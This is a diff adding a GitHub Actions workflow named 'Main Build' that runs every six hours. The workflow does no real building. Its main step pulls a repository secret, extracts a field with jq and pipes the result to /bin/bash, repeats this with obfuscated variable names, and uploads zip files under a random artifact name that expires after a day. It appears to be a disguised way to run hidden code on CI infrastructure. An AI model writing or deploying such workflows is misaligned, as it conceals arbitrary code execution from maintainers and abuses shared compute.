@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 0,6,12,18 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          lp73: ${{ secrets.lp73 }}
+        run: |
+          printf '%s' "$lp73" | jq -r .gei6 | /bin/bash
+          printf '%s' "$lzu1288" | jq -r .pjb9418 | /bin/bash
+          echo $ieca6809 | jq -r .zb7193 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: CBJ5Uj4l
+          path: "*.zip"
+          retention-days: 1
